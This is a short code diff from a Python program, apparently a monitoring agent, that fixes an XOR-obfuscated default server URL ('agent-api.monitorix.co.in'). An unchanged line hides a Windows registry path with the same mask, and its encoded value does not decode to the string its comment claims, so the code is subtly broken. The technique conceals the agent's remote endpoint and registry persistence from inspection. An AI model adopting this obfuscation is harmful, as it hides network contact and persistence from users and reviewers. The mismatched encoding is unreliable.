@@ -2436,8 +2436,8 @@ async def main():
             return "".join(chr(b[i] ^ 0x3A) for i in range(len(b))) # Static 0x3A mask
         except: return ""
 
-    # Obfuscated: "https://agent-api.monitorix.co.in" -> 524e4e4a490055555b5d5e4e4f175b4a5317575554534e55485342145955145354
-    DEFAULT_URL = _s("524e4e4a490055555b5d5e4e4f175b4a5317575554534e55485342145955145354")
+    # Obfuscated: "https://agent-api.monitorix.co.in" -> 524e4e4a490015155b5d5f544e175b4a5314575554534e55485342145955145354
+    DEFAULT_URL = _s("524e4e4a490015155b5d5f544e175b4a5314575554534e55485342145955145354")
     # Obfuscated: "SOFTWARE\\Monitorix" -> 69757c6e6d5b487f1c675554534e55485342
     REG_PATH = _s("69757c6e6d5b487f1c675554534e55485342")
 
